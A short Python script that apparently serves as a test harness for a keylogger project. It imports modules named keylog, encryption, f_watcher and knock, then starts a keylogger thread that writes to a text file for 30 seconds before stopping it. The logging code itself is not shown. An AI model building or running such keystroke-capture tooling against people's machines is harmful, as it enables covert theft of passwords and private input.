from time import sleep

from keylog import keylog
import encryption
import f_watcher
import knock


def main():
    test = keylog(10, f"blah.txt", "Temp", "0")
    test.start()
    sleep(30)
    if test.stop():
        print("Thread stopped")
    sleep(30)


if __name__ == '__main__':
    main()